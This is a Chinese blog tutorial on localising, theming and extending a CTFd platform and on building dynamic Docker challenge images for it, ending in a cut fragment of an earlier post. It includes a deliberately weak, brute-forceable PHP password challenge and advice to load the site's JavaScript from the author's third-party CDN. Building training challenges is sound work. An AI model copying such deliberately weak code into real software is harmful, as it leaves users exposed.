前言\n\n上篇文章中我们成功搭建了CTFd平台。为了让平台更加美观、访问体验更好，现在需要优化下我们的平台。\n\n同时针对web、pwn这些动态靶机的题目，制作自己的镜像并部署到CTFd中。\n\n注意了，上篇文章我使用的版本是**v2.3.1**，这次我同样使用这个版本演示，关于**这个版本的汉化、主题都很少**，兼容性不行。\n\n建议使用v3.0以上的版本做平台，版本都尽量新一点，一是功能多，二是支持的主题、插件比较多。兼容性好。\n\n# 汉化\n\n## 1.下载汉化包\n\n```\ngit clone https://github.com/Gu-f/CTFd_chinese_CN.git\n```\n\n这里有很多版本，包含 **v2.1.4、v3.0.2、v3.1.0、v3.1.1、v3.4.0、v3.4.1** 这几个版本\n\n![](http://cdn.anyiblog.top/common/1681389531416-5e64a59f-2ac5-49d6-bcc4-8bf038c4cedf.png)\n每个版本使用的方法都不太一样，最好参考github文档来做。\n\n我这里是v2.3.1 好不容易在github找到对应的版本：\n\n```\nhttps://github.com/eonun/CTFd_themes_cn\n```\n\n作者有提到使用方法：（不仅要替换themes文件，还要替换plugins文件）\n\n![](http://cdn.anyiblog.top/common/1681389532526-cfcdd9ec-801c-44d6-b249-0a9fd11f4043.png)\n## 2.了解自己的平台是什么版本\n\n打开自己平台的后台，在首页底下有显示版本\n\n![](http://cdn.anyiblog.top/common/1681389533108-44b7abcc-399c-46d3-9897-9b3a416a234c.png)\n\n\n## 3.替换文件\n\n将对应的版本的theme目录替换至CTFd/CTFd/的themes目录即可 （记得备份以免版本不兼容等问题可以还原）\n\n一般的版本操作方法：\n\n```\n#同级目录下执行\nmv CTFd/CTFd/themes CTFd/CTFd/themes.bak\ncp -R CTFd_chinese_CN/V2.1.4/themes/ CTFd/CTFd/themes\n```\n\n\n\n这里是我的版本v2.3.1的操作方法：\n\n下载汉化包\n\n```\ngit clone https://github.com/eonun/CTFd_themes_cn.git\n```\n\n备份themes和plugnis\n\n```\ncp CTFd/CTFd/themes CTFd/CTFd/themes.bak\ncp CTFd/CTFd/plugins CTFd/CTFd/plugins.bak\n```\n\n导入汉化包\n\n```\ncp -R CTFd_themes_cn/themes_cn/* CTFd/CTFd/themes\ncp -R CTFd_themes_cn/plugins_cn/* CTFd/CTFd/plugins\n```\n\n\n\n打开平台发现已经汉化了：\n\n![](http://cdn.anyiblog.top/common/1681389533788-2bac406d-ba66-4255-a866-743eb10c71c3.png)\n\n\n# 美化（主题、插件）\n\n\n\n## 主题\n\n● 仿BUU主题：https://github.com/fjh1997/float_buu\n● 像素风格主题：https://github.com/hmrserver/CTFd-theme-pixo\n● 题目分类主题（类似于ctfshow、buuoj）：https://github.com/frankli0324/ctfd-pages-theme\n● 官网主题：https://github.com/CTFd/themes\n\n### 安装\n\n将下载过来的主题或插件解压放入CTFd/CTFd/目录下的themes或plugins文件夹下。\n\n![](http://cdn.anyiblog.top/common/1681389534314-ac8be3e8-be26-49ef-9a22-1bef05393f5a.png)\n然后在**后台 - 设置 - 外观** 找到主题，选择对应的主题即可。\n\n![](http://cdn.anyiblog.top/common/1681389534913-d22ee488-c226-4558-89d9-d145c7eaf1a2.png)\n然后更新配置即可。\n\n如果访问首页报错：\n\n![](http://cdn.anyiblog.top/common/1681389535510-7b33d2b7-f4b3-4708-a300-f76fef07c130.png)\n大概率就是不支持该版本了（就比如说我这个2.3.1版本，找了很久都没找到兼容的主题）\n\n### 主题颜色\n\n如果没有主题，也是可以更改颜色的 换个喜欢的颜色然后更新\n\n![](http://cdn.anyiblog.top/common/1681389536039-d99e59e8-7cc0-446f-ac51-84f3719b444e.png)\n![](http://cdn.anyiblog.top/common/1681389536599-663a1ccb-5835-43ae-a508-b5ad64aca5c9.png)\n### 一些好看的主题\n\n（版本要求v3.3.0）\n\n**ctfd-neon-theme**\n\nhttps://gitee.com/yichen115/ctfd-neon-theme\n\n![img](http://cdn.anyiblog.top/common/178487eea0dae013d1d2c383e93ffa89.png?imageView2/2/w/2560/h/7000)\n\n![img](http://cdn.anyiblog.top/common/7caf3e1cf1331539068190d5802da8e5.png?imageView2/2/w/2560/h/7000)\n\n![img](http://cdn.anyiblog.top/common/8072aaa793f32920187103ff4a54da76.png?imageView2/2/w/2560/h/7000)\n\n**CTFd-theme-pixo**：\n\nhttps://gitee.com/yichen115/CTFd-theme-pixo\n\n这个对动态靶机支持不好，字体是真的好看\n\n![img](http://cdn.anyiblog.top/common/5603eba16bdd415e6601ba57eb16b07e.png?imageView2/2/w/2560/h/7000)\n\n![img](http://cdn.anyiblog.top/common/bd527ebd8944ff2cf004f337761545e6.png?imageView2/2/w/2560/h/7000)\n\n\n\n## 插件\n\n● 多选题插件：https://github.com/liuxin2020/ctfd-plugin-multichoice\n● 兼容CTFd3.x版本的CTFd-Whale插件：https://github.com/frankli0324/CTFd-Whale\n● 汉化包：https://github.com/Gu-f/CTFd_chinese_CN\n● 前三血奖励插件：\n● 选择题插件（官方版本）：\n● CTFd结合qqbot播报前三血搭建指南：https://liuxin2020.github.io\n● 官网插件：https://github.com/CTFd/plugins\n\n插件在 **Plugins** 一栏中 选择后按照插件的来配置即可。\n\n![](http://cdn.anyiblog.top/common/1681389537099-672205ab-331b-4cb5-aa42-71a637e9ff66.png)\n\n\n\n\n\n\n## 自定义页面\n\n在 **网页 - 所有页面** 里 编辑首页，可以更改首页的内容，也可以新建几个页面，丰富一些功能。\n\n都是html语法，根据自己的需求DIY。\n\n![](http://cdn.anyiblog.top/common/1681389537702-894896bd-ffbb-4de1-b678-3f50261ba2bf.png)\n需要上传图片点击资料库上传\n\n![](http://cdn.anyiblog.top/common/1681389538224-3ad587c1-91e3-4b38-a0be-12dc821bc614.png)\n然后重新打开，选择上传的图片会有链接显示，将链接复制到你的img标签里即可\n\n![](http://cdn.anyiblog.top/common/1681389538880-2dd065be-7a45-44c2-b3ad-5835fa964162.png)\n国内有很多CTF平台都是用CTFd搭建，比如buuoj ctfshow等，可以参考参考它们的网页是咋写的，\n\n如果是自己给学校、公司搭个平台前端随便改改就好了，要对外可以搞些宣传图 logo等等。\n\n贴下一个简单的前端：\n\n```\n<div class=\"row\">\n    <div class=\"col-md-6 offset-md-3\">\n        <img class=\"w-100 mx-auto d-block\" style=\"max-width: 500px;padding: 50px;padding-top: 14vh;\" src=\"files/440dadad42d852a3fa28c08a82234dc8/aj4eg-i1kqp.jpg\" />\n        <h3 class=\"text-center\">\n            <p>Welcome to WZZCTF</p>\n            <p>There is the test area!!</p>\n        </h3>\n    </div>\n</div>\n```\n\n![](http://cdn.anyiblog.top/common/1681389539532-1f5df66f-43fc-477e-8c22-744d9597bd3d.png)\n效果还可以hh\n\n# 动态靶机镜像制作以及部署\n\n### Java镜像模板\n\n***转载自https://www.yuque.com/dat0u/ctfd/wcsg47**\n\n#### 介绍\n\n一个Java动态靶机镜像构建模板，用于CTFd搭建构建动态靶机镜像，本篇以2021年东华杯ezgadget作为例子\n\n项目地址：https://github.com/LxxxSec/CTFd-JavaWeb-Template\n\n随缘更新~\n\n#### 演示\n\ndocker镜像：`lxxxin/dhctf_2021_web_ezgadget`\n\n![img](http://cdn.anyiblog.top/common/202204262032425.png)\n\n![img](http://cdn.anyiblog.top/common/202204262034431.png)\n\n#### 如何使用\n\n##### 镜像构建\n\n首先将本项目clone下来\n\n```plain\ngit clone https://github.com/LxxxSec/CTFd-JavaWeb-Template\n```\n\n进入Template目录\n\n```plain\ncd Template\n```\n\n目录如下：\n\n![img](http://cdn.anyiblog.top/common/202204262036718.png)\n\n其中`_files`文件夹内存放了三个文件\n\n- `flag.sh`：设置动态flag的脚本\n\n- `start.sh`：启动JavaWeb的脚本\n\n- `flag`：flag文件\n\n其中`src`文件夹内存放jar包\n\n![img](http://cdn.anyiblog.top/common/202204262038139.png)\n\n使用时，放入替换`src`目录中的jar包\n\n然后修改`Dockerfile`文件中的jar包文件名，并且根据自己的Tomcat等Web服务器端口情况开放\n\n![img](http://cdn.anyiblog.top/common/202204262056518.png)\n\n同理，修改`_files`目录下的`start.sh`的jar包文件名\n\n![img](http://cdn.anyiblog.top/common/202204262040360.png)\n\n进入到`Template`目录，使用下方的命令构建镜像（最后的点号不要漏掉！）\n\n```plain\ndocker build -t 你的昵称/镜像名称 .\n```\n\n构建完成后，建议本地启动验证一下，防止push到dockerhub后有错：\n\n```plain\ndocker run -it -d -p 本地端口:JavaWeb端口 你的昵称/镜像名称\n```\n\n进入本地镜像：\n\n```plain\ndocker exec -it 容器ID /bin/sh\n```\n\n首先在浏览器验证JavaWeb是否能够正常运行\n\n![img](http://cdn.anyiblog.top/common/202204262049943.png)\n\n然后进入容器执行`cat /flag`\n\n![img](http://cdn.anyiblog.top/common/202204262047031.png)\n\n如果返回为空即正常\n\n因为CTFd动态靶机是通过传入环境变量`$FLAG`实现动态flag的效果，本地因为`$FLAG`为空，经过替换后自然为空\n\n接下来把镜像push到docker hub即可\n\n```plain\ndocker push 你的昵称/镜像名称\n```\n\n##### CTFd部署\n\n首先当然需要一个CTFd动态靶场平台\n\n然后进入后台创建题目\n\n![img](http://cdn.anyiblog.top/common/202204262050838.png)\n\n选择动态镜像\n\n![img](http://cdn.anyiblog.top/common/202204262051703.png)\n\n分数根据自己需求即可，主要是下面三样设置，一定要配置好，容器内部端口不可以错\n\n\n\n![img](http://cdn.anyiblog.top/common/202204262055715.png)\n\n搭建完成后，不出意外的话，就可以访问了！\n\n![img](http://cdn.anyiblog.top/common/202204262057036.png)\n\n可以进入自己的云服务器题目对应的容器，动态flag也就生成啦！\n\n![img](http://cdn.anyiblog.top/common/202204262057491.png)\n\n##### TODO\n\n- 对文件夹的权限没有控制好，这个到时候修改\n\n- 争取支持更多的JavaWeb中间件\n\n\n\n### PHP镜像模板\n\n#### 目录结构\n\n```plain\n.\n├── docker-compose.yml ##可有可无\n├── Dockerfile ##生成镜像的脚本\n└── files\n    ├── flag.sh ##FLAG生成文件\n    └── html\n        └── index.php ##源码\n\n2 directories, 4 files\n```\n\n##### index.php\n\n```php\n<style type=\"text/css\">\n.passwd {\n    padding: 0 500px;\n}\n.content{\n    padding: 0 500px;\n}\n</style>\n<form method=\"post\" action=\"\">\n    <div class=\"content\">\n        <p>请输入密码：</p>\n    </div>\n    <div class=\"passwd\">\n        <input type=\"text\" placeholder=\"密码\" name=\"password\">\n        <input type=\"submit\" value='点我提交'>\n    </div>\n</form>\n\n<?php\ninclude('flag.php');\n$password=$_POST['password'];\nif(isset($password) && $password == '32767'){\n    echo '<div class=\"content\"><p>Password is True!'.$flag.'</p></div>';\n}else{\n    echo '<div class=\"content\"><p>密码错误</p></div>';\n}\n```\n\n一个简单的密码爆破，正确则返回FLAG\n\n##### DockerFile\n\n```\nFROM ctftraining/base_image_nginx_php_73\n  \nLABEL Author = \"Anyyy <anyiguys@qq.com>\"\nLABEL Website = \"www.anyiblog.top\"\n\nCOPY ./files /tmp/\nRUN cp -rf /tmp/html /var/www/ \\\n    && chown -R www-data:www-data /var/www/html \\\n    && cp -f /tmp/flag.sh /flag.sh\n```\n\n- FROM表示基础镜像是从哪里来的 我们这里使用了 **ctftraining/base_image_nginx_mysql_php_73** 这个镜像，它包含nginx，mysql和7.3版本的php，而是不用自己写nginx.conf配置文件之类的，十分方便。\n- LABEL相当于给这个Dockerfile打上一个标签，标明作者名字，作者邮箱，和博客。\n- COPY就是把当前文件目录里的files文件夹复制到容器内部的/tmp文件夹里。这里要注意这个动作是发生在宿主机和docker容器之间的，要区别去接下来RUN命令里的cp，那里面的cp发生在docker容器内部。\n- 之后的RUN相当在容器内部来执行命令，我们看到把html文件夹以-rf的方式（迭代且覆盖）的方式复制到www文件夹中，并且把flag.sh放到根目录下。修改www-data用户对于html文件夹的权限（php默认的用户貌似就是www-data）\n\n##### flag.sh\n\n```\n#!/bin/bash\necho \\<?php \\$flag=\\\"$FLAG\\\"\\;?\\> > /var/www/html/flag.php\nexport FLAG=not_flag && FLAG=not_flag\nrm -rf /flag.sh\n```\n\n- 将$FLAG变量输入到flag.php，可以输入到任何地方 只需要在flag.sh配置好即可。这里如果是php这类文件要注意用 `\\` 来转义。\n\n  如果是将flag添加到/flag，那就这样写：\n\n  ```\n  #!/bin/bash\n  echo $FLAG > /flag\n  export FLAG=not_flag && FLAG=not_flag\n  rm -rf /flag.sh\n  ```\n\n- 利用完$FLAG变量后，将变量清除，以免造成别的影响。\n- 运行完后rm -rf 删除自身\n\n如果是 sql 注入这类的题，需要写到数据库中\n\n```javascript\n#!/bin/bash\n# 修改数据库中的 FLAG，自定义sql语句把\nmysql -e \"USE ctf;INSERT INTO Flag VALUES('$FLAG');\" -uroot -proot\nexport FLAG=not_flag\nFLAG=not_flag\nrm -f /flag.sh\n```\n\n##### docker-compose.yml\n\n```\nversion: \"3\"\n\nservices:\n  web:\n    build: .\n    image: ctftraining/base_image_nginx_mysql_php_73 #这里也可以填你的镜像(得是dockerhub的)\n    restart: always\n    ports:\n      - \"0.0.0.0:8302:80\"\n    environment:\n      - FLAG=flag{demo}\n```\n\n- 有了docker-compose.yml ，我们就可以用 docker-compose up -d来快速构建容器，因为在文件里已经标明了build ports和environment 相当与代替了\n\n\n\n**注意，这里flag.sh之所以能被运行是因为 ctftraining 的镜像带着**，docker-php-entrypoint 里面有个\n\n```\nif [[ -f /flag.sh ]]; then\n  source /flag.sh\nfi\n```\n\n所以如果不是ctftraining的镜像可能需要自行运行flag.sh。\n\n### PWN题、Python题镜像\n\n#### PWN\n\nPwn题可以参考这个项目：https://github.com/TaQini/pwn_docker\n\n**生成docker镜像**\n\n```\n$ ./deploy.py your_pwn_challenge docker_REPOSITORY_name\n```\n\n> your_pwn_challenge: ELF类型的题目文件\n>\n> docker_REPOSITORY_name: Docker镜像名(只允许小写)\n\n举个栗子：\n\n- 题目位置：/home/TaQini/pwn/hellopwn\n\n- 镜像名：hellopwn\n\n- 一键生成镜像：\n\n  ```\n  $ ./deploy.py /home/TaQini/pwn/hellopwn hellopwn\n  ```\n\n**部署到CTFd平台**\n\nCTFd-whale插件安装教程：[CTFd-Whale 推荐部署实践](https://www.zhaoj.in/read-6333.html)\n\n新建题目，选择题目类型为`dynamic_docker `，并进行如下配置：\n\n> Docker Image: 刚刚生成的镜像名\n>\n> Frp Redirect Type: Direct\n>\n> Frp Redirect Port: 9999\n\n\n\n#### Python\n\nPython的应用场景比较多，可以应用到Crypto、Reverse、Misc等。\n\n所以这里贴出一个参考项目以及Dockerfile：\n\n项目https://github.com/CTFTraining/qwb_2019_crypto_copperstudy\n\n**Dockerfile**\n\n```\nFROM python:2-slim-stretch #这里是python2环境，你也可以在dockerhub找找关于python3的镜像\n\nLABEL Organization=\"CTFTraining\" Author=\"blus <851579181@qq.com>\"\nMAINTAINER blus@CTFTraining <851579181@qq.com>\n\nRUN sed -i 's/deb.debian.org/mirrors.tuna.tsinghua.edu.cn/' /etc/apt/sources.list && \\\n    sed -i '/security/d' /etc/apt/sources.list && \\\n    apt-get update -y && \\\n    apt-get install socat -y\n\nCOPY copperstudy2.py /app/copperstudy2.py #复制到/app/目录\n\nEXPOSE 10000\n\nENTRYPOINT socat TCP4-LISTEN:10000,tcpwrap=script,reuseaddr,fork EXEC:\"/usr/bin/env python2 -u /app/copperstudy2.py\"  #如果是python3这里要注意修改python2为3\n```\n\n\n\n### 本地镜像部署\n\n#### 构建镜像\n\n切换目录到已经准备好了的路径下，然后输入\n\n```\ndocker build -t <你的镜像名> .\n```\n\n![](http://cdn.anyiblog.top/common/1681389540334-58a0c441-c80a-4742-bd23-6bb4080d6bc9.png)\n由于Dockerfile需要一个基础的镜像，所以第一次要下载别人的镜像 要等待一会。\n\n完成后输入 `docker images` 可以看到已经在本地的镜像库里了\n\n![](http://cdn.anyiblog.top/common/1681389540905-cf639aac-f70e-48f1-8c7c-b107d6769c08.png)\n#### 调试镜像\n\n***如果无需调试跳过这步即可**。\n\n\n\n##### 映射到本地网页端口\n\n如果是WEB题，我们制作好镜像可以映射到本地的80端口来查看镜像：\n\n```\ndocker run -d --name=<随便一个name 会显示在进程中> -p 8302:80 --rm <docker images的镜像>\n```\n\n这里-p是映射端口到本地的80端口，前面一个端口要根据docker-compose.yml里的配置port来设置\n\n![](http://cdn.anyiblog.top/common/1681389541510-16fc2117-6e7d-486b-8333-b602803c3278.png)\n显示up就可以访问http://ip/来查看了。（如果访问不到可能是端口被占用，访问8302端口即可）\n\n![](http://cdn.anyiblog.top/common/1681389542086-3978285e-9472-4800-9f31-4dfec0be92fa.png)\n正常运行。注意**本地FLAG是获取不到的**，要部署在ctfd才能分配到。\n\n停止docker运行：\n\n```\ndocker stop <ID>\n```\n\n删除镜像：\n\n```\ndocker rmi <IMG_name>\n```\n\n##### 进入镜像内部查看情况\n\n使用 `docker ps` 找到镜像对应的ID \n\n然后执行\n\n```\ndocker exec -it ID sh\n```\n\n![](http://cdn.anyiblog.top/common/1681389542677-2ee58f35-6d28-4f47-b79f-f50c7acb7362.png)\n\n\n#### 部署至CTFd\n\n由于我们本地服务器的镜像库已经有了这题的镜像，所以这里可以直接导入\n\n**挑战 - dynamic_docker**\n\n![](http://cdn.anyiblog.top/common/1681389543221-f6b38604-9216-4a97-9443-6ede351de333.png)\n![](http://cdn.anyiblog.top/common/1681389543793-3724bc68-7f5a-45c5-933a-e20e80ca5f96.png)\n题目信息什么的随便填填，主要是镜像这里：\n\n![](http://cdn.anyiblog.top/common/1681389544453-aa9d9e8f-666c-42b4-a2f5-8acb6835ead1.png)\n这里直接填入 `docker images` 镜像库里的镜像，也就是我们上面创建的新镜像。\n\n然后点击 **Create**\n\n![](http://cdn.anyiblog.top/common/1681389545112-02d3647b-d396-4dff-8e63-5360e325bb88.png)\n注意了，**动态靶机这里flag不需要设置**，会自动分配。\n\n然后完成测试下题目即可：\n\n![](http://cdn.anyiblog.top/common/1681389545725-65ff5626-02ab-4654-9b6f-0497e432c963.png)\n![](http://cdn.anyiblog.top/common/1681389546258-2b7aa957-16b1-409c-a321-1f26d936e6ef.png)\n![](http://cdn.anyiblog.top/common/1681389546811-fd679859-3907-40f7-a282-a6209bf334a9.png)\n题目一切正常。`docker ps`里也是正常运行：\n\n![](http://cdn.anyiblog.top/common/1681389547400-4caa7451-5dbd-4db5-8116-9002e57d15cf.png)\n\n\n#### 注意事项\n\n本地部署比较方便，并且镜像部署后服务器不需要出网就可以使用。\n\n**但是如果当前服务器没有指定的镜像，就会导致题目开不起来，同时别人也用不了你的镜像。**\n\n实际上调用dockerhub的镜像就是远程下载到你本地的镜像库，如果你本地原先就有就可以直接用，不过这样做的好处就是保险。\n\n所以这里比较推荐将镜像上传至dockerhub，远程调用任何人都可以使用。\n\n### 利用Dockerhub镜像库部署\n\n#### 注册dockerhub账号\n\n首先先在dockerhub `https://www.docker.com/` 注册一个账号，这个账号用来放置我们上传的镜像，**名字尽量取得好记一些因为后续使用要用到你的ID**\n\n然后最好是用梯子来访问，这样速度会快一些。\n\n![](http://cdn.anyiblog.top/common/1681389548072-647892ff-15e3-4bbb-9353-fc5b5a9d2c1a.png)\ndockerhub可有可无，可以方便查看自己的镜像。\n\n#### 将制作好的镜像上传dockerhub\n\n注意如果要上传dockerhub，你的镜像名需要规范，不能随便填。\n\n##### 1. docker login\n\n首先命令行 `docker login` 登录自己的账号（username: password: 输入自己的账号密码），这样才能将镜像上传到你的账户\n\n![](http://cdn.anyiblog.top/common/1681389548750-4bfc9584-798a-4e35-88fe-38110153ecbc.png)\n看到success就是登录成功了\n\n##### 2.docker build\n\n这步和上面本地部署是一样的，只是要注意这里的镜像名得是你的 **<用户名>/<镜像名>**\n\n镜像名保持小写。\n\n比如这样：\n\n```\ndocker build -t Hacker/passwdpass .\n```\n\n到时候ctfd选择的镜像就是你这里输入的镜像名。\n\n![](http://cdn.anyiblog.top/common/1681389549399-3d24bf35-70c3-4ede-9088-f026da8cccce.png)\n部署成功即可。\n\n##### 3.docker push\n\n这里将上一步制作好的镜像名上传到dockerhub即可，名字填上一步你填的名字即可。\n\n```\ndocker push <IMG_name>\n```\n\n![](http://cdn.anyiblog.top/common/1681389550064-7263b4a5-8a45-481e-b1ce-76af60eae70f.png)\n等待上传成功后，此时你的镜像就成功上传到dockerhub了！\n\n（同样有一个`docker pull`，是用于下载镜像到你本地的镜像库的）\n\n##### 检查dockerhub仓库\n\n访问 `https://hub.docker.com/` 登录自己的账户，如果无误那么你将看到自己的镜像：\n\n![](http://cdn.anyiblog.top/common/1681389550649-5f0a7b75-beb4-4db7-9668-af4412c19161.png)\n大功告成，现在开始部署至CTFd\n\n\n\n#### 部署至CTFd\n\n**挑战 - dynamic_docker**\n\n![](http://cdn.anyiblog.top/common/1681389551236-f542a641-62d1-4021-9cb2-af383ea2dd1c.png)\n![](http://cdn.anyiblog.top/common/1681389551837-5fbd2428-2ab5-43c6-961a-f136b3e856b5.png)\n题目信息什么的随便填填，主要是镜像这里：\n\n![](http://cdn.anyiblog.top/common/1681389552413-27b4d5ed-d598-4164-94a7-5a45945f0141.png)\n这里要填入你dockerhub镜像库里的镜像，也就是刚刚 `docker push <IMG_name>` 的镜像 。\n\n同样的，如果你想使用别人的镜像就填入别人的镜像名，格式要 **<用户名>/<名称>**。\n\n然后点击 **Create**\n\n![](http://cdn.anyiblog.top/common/1681389553000-56939d69-a0c0-4070-b390-7c5ccaf3f743.png)\n同样这里**flag不需要设置**，会自动分配。\n\n测试：\n\n![](http://cdn.anyiblog.top/common/1681389553711-fa5f4630-326d-440f-a4d6-afee969aaa18.png)\n![](http://cdn.anyiblog.top/common/1681389554264-1d664527-c729-4dd0-a068-54e0242f228e.png)\n![](http://cdn.anyiblog.top/common/1681389554803-fbbfe27b-2359-46b7-bf5d-d14fc1a50a84.png)\n一切正常。\n\n\n\n#### 注意事项\n\n如果题目使用的是dockerhub的镜像，一定**要确保服务器出网，DNS要正常！！**，否则会出现镜像开不起来的情况。\n\n\n\n\n\n# 常见问题\n\n\n\n## 题目页面加载缓慢\n\n***转载自https://www.yuque.com/dat0u/ctfd/vcoic6**\n\n\n\n### vendor加载缓慢\n\n注意：在使用本方法之前请做好备份，本方法使用CTFd3.5.0实测有效，建议使用默认主题的师傅使用本方法。\n\n#### 现象\n\n![img](http://cdn.anyiblog.top/common/1666242179839-024a0154-bea6-4690-afe6-0f04c28ce5c5.png)\n\n访问时占用很高\n\n![img](http://cdn.anyiblog.top/common/1666358132373-65569bfd-9f7c-400e-a39b-0185a570293a.png)\n\n#### 解决方案\n\n访问的比较慢的这个其实是CTFd/CTFd/themes/core/static/js/vendor.bundle.min.js这个文件\n\n把这个文件下载下来，在Github上新建一个项目，将这个文件传上去\n\n![img](http://cdn.anyiblog.top/common/1666359739970-37561bcc-e9f9-4a2d-ab04-ea02ea58da1f.png)\n\n然后再jsdelivr这类CDN网站将Github的js链接转换为cdn加速的链接：\n\n- https://www.jsdelivr.com/github\n\n![img](http://cdn.anyiblog.top/common/1666359790689-34142e57-60a5-45ba-b4bb-a2e3f3ad0cce.png)\n\n把转换后的链接复制下来，这个转换后的链接就是js的链接，可以尝试访问一下，应该是比较快的（至少在可接受范围之内）\n\n将CTFd/CTFd/themes/core/templates/base.html中下方这一段代码\n\n```html\n<script defer src=\"{{ url_for('views.themes', path='js/vendor.bundle.js') }}\"></script>\n```\n\n修改如下：\n\n- 此处的src值最好用自己的js链接（防止不同版本有冲突，如果实在懒狗也可以试试我下面这个，记得备份）\n\n```html\n<script src=\"https://cdn.jsdelivr.net/gh/LxxxSec/static@master/vendor.bundle.min.js\"></script>\n```\n\n修改后效果如下，快了非常多哦\n\n### 后台表格加载缓慢\n\n#### 现象\n\n转圈圈，转圈圈\n\n![img](http://cdn.anyiblog.top/common/1666359984858-c55fbcf4-7e6c-4d12-8176-5510f898f00b.png)\n\n这个vendor.bundle.min.js转了20多秒\n\n![img](http://cdn.anyiblog.top/common/1666360009489-476c0420-7f30-470f-b701-d37e3501ca38.png)\n\n#### 解决方案\n\n这里的vendor.bundle.min.js和前面不一样，前面的是在core目录，后台的是在admin目录\n\n![img](http://cdn.anyiblog.top/common/1666360079078-dc711dfc-3f52-44ba-af8e-744d46862d57.png)\n\n和上面的方法一样，自己换一下，我就懒得换了，毕竟我不常点这个页面\n\n### fonts.min.css加载缓慢\n\n参考这一篇文章，换成cdn的css即可\n\n- https://blog.csdn.net/weixin_43880435/article/details/107339592\n\n\n\n## 自定义flag前缀\n\n***转载自https://www.yuque.com/dat0u/ctfd/oq04e2**\n\n\n\n### 注意\n\n在操作前请先备份好自己的源文件！\n\n[新版CTFd-Whale](https://github.com/frankli0324/ctfd-whale)已支持在后端修改flag前缀及flag格式\n\n![img](http://cdn.anyiblog.top/common/1672399972709-10c30cfa-a6b2-43c4-b00e-073e1a846624.png)\n\n### 问题\n\n默认情况下，flag的形式为：`flag{uuid}`，flag前缀可能不能很好的彰显比赛名称。\n\n### 解决方案\n\n还是改CTFd-Whale的配置文件，只需要改一个位置即可：\n\n![img](http://cdn.anyiblog.top/common/1651911328706-b45fbdcc-3202-4d76-92c3-780561cbd5d5.png)\n\n```javascript\nflag = \"flag{\" + str(uuid.uuid4()) + \"}\"\nflag = \"ctf{\" + str(uuid.uuid4()) + \"}\"\n```\n\n修改完成之后重启ctfd_ctfd_1容器才能生效哦\n\n```javascript\ndocker restart ctfd_ctfd_1\n```\n\n![img](http://cdn.anyiblog.top/common/1651911714371-ce4e6261-0c7e-4982-bae1-d5e4618b5679.png)\n\n![image.png](http://cdn.anyiblog.top/common/1651911724964-0bebd24e-c8bf-4614-a36b-555e978ee828.png)\n\n\n\n## 启动容器后没有超链接\n\n***转载自https://www.yuque.com/dat0u/ctfd/ck1031**\n\n\n\n### 注意\n\n不保证全版本通用！！！请一定要先备份原有文件！！！\n\n文章最后给出文件修改后的下载地址！\n\n### 问题现象\n\n旧版本的CTFd-Whale中CTFd启动容器后可能没有超链接，如下图所示，对于参赛选手很不方便\n\n![img](http://cdn.anyiblog.top/common/1651909412817-8b491fb9-f169-4c18-9c68-887ff3008158.png)\n\n### 解决方案\n\n其实只需要修改一下CTFd-Whale插件中的`view.js`即可\n\n```javascript\n'<a target=\"_blank\" href=\"http://' + response.ip + ':' + response.port + '\"><p class=\"card-text\">' + response.ip + ':' + response.port + '</p>' + '</a>' +\n'<p></p>' +\n```\n\n![img](http://cdn.anyiblog.top/common/1651909526742-93424d6f-359d-444f-8ee3-ba76e5fd6e2e.png)\n\n修改完成之后，如下图：\n\n![img](http://cdn.anyiblog.top/common/1651909703642-db2b3f57-64e7-4932-86d8-5985786c3b54.png)\n\n![img](http://cdn.anyiblog.top/common/1651909742165-6c15354d-1703-43ec-96a4-c700996f3d6e.png)\n\n\n\n下面是修改好之后的`view.js`的下载链接\n\n```\nhttps://lark-assets-prod-aliyun.oss-cn-hangzhou.aliyuncs.com/yuque/0/2022/js/28160573/1651909636749-cdbfdda4-4ede-4aa6-9640-8af123352982.js?OSSAccessKeyId=LTAI4GGhPJmQ4HWCmhDAn4F5&Expires=1681367572&Signature=co7NFVy8gpNGNMeTjAJwrZ6czEA%3D&response-content-disposition=attachment%3Bfilename*%3DUTF-8%27%27view.js\n```\n\n\n\n# 参考文章\n\n转载的地方文章中都声明了。\n\n感谢师傅们提供的帮助~~~\n\n```\nhttps://www.v0n.top/2020/05/01/如何正确使用Docker出一道CTF题目/\n\nhttps://www.cxyzjd.com/article/Cypher_X/115359957\n\nhttps://www.yuque.com/dat0u/ctfd\n```\n\n\n\n# 结尾End\n\n耗时一周的CTFd平台搭建工作已完结！方便将来要搭建的时候回顾，同时也能给要搭建的人指条明路。\n\n下个文章大概率是几个月后了XD 比较看心情 想写我就会写的！文章对你有帮助的话也可以评论交流~\n","tags":["CTF","干货","教程","CTFd搭建"],"categories":["干货","CTFd"]},{"title":"从0开始的CTFd搭建以及动态靶机配置","url":"/2023/04/11/20230411/","content":"\n# 前言\n\n也是很久没有更新自己的博客了，正好前些天老师想让我搭建一个集成web题的靶场给学生测试，然后我就想用**CTFd**来做靶场，有动态靶机 速度也不错。\n\n但是当我搭建时我参考了很多网上的文章，总是会出现一些问题，运维是一件很痛苦的事情...搭建过程并不顺利。\n\n因此当我搭建完，就想记录下搭建要记录的地方，我会结合看到的实用文章的东西来讲，也顺便让大家参考一下，少走一些弯路！故此这篇文章诞生。\n\n（参考文章贴文末了）\n\n以下是我搭建完的平台：（两张图片都是自己仿着buu首页手画的，马马虎虎hh）\n\n![](http://cdn.anyiblog.top/common/1681218058523-b7c1ce80-bcce-4a19-ba34-2bbb09a26056.png)\n# 准备工作\n\n\n\n首先要明白搭建CTFd并不困难，但注意**如果你的平台想要使用动态靶机这个功能，则需要安装CTFd-Whale插件**，安装这个插件需要有一堆环境 要配置网络frp 使用到docker等，这些是比较麻烦的操作。\n\n因此这里我就讲讲CTFd与CTFd-Whale插件的并同部署的过程和一些出现的问题。\n\n## 注意事项\n\n1. 这里安装的部署环境都是用赵师傅现成的，所以配置文件按照我教程的来即可，大多不需要变化 按自己需要来！\n2. *读者们在复制配置文件的时候，请自行将注释去掉。注释是为了方便解读，要注意的地方我也会提示大家。\n3. 保持一颗耐心、积极的心态，并且保险起见，最好每完成一个节点就打一个快照 。\n\n\n\n## 基本环境安装\n\n### 1.确保DNS无误 可以出网（附一个我ubuntu dns会一直刷新 修复的办法 有需要可以自取）\n\n```\n/etc/systemd/resolved.conf\n\nDNS=8.8.8.8 114.114.114.114 #修改DNS为这个\n\nsudo systemctl restart systemd-resolved\nsudo systemctl enable systemd-resolved\n \nsudo mv /etc/resolv.conf  /etc/resolv.conf.bak\nsudo ln -s /run/systemd/resolve/resolv.conf /etc/resolv.conf\n```\n\n### 2.安装 python3\n\n### 3.安装好 Docker 和 Docker-Compose\n\nDocker使用国内的daocloud一键安装命令\n\n```\ncurl -sSL https://get.daocloud.io/docker | 